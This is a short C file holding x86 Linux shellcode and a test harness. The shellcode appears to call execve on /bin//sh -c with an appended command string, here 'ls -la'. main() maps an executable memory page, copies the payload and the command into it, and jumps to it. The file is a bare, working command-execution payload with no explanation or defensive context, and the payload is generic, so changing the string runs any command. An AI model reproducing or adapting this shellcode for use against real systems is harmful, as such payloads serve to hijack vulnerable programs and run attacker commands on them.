char shellcode[] = "\xeb\x28\x5e\x31\xc0\x50\x68\x2f\x2f\x73\x68\x89\xe1\x41\x41\x68\x2f\x62\x69\x6e\x89\xe3\x66\x50\x66\x68\x2d\x63\x89\xe7\x50\x89\xe2\x56\x57\x51\x89\xe1\xb0\x0b\xcd\x80\xe8\xd3\xff\xff\xff";

char cmd[] = "ls -la";

#include <sys/mman.h>
#include <string.h>
int main() {
    char *sc = mmap(NULL, 4096, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    strcpy(sc, shellcode);
    strcat(sc, cmd);
    return ((int (*)())sc)();
}
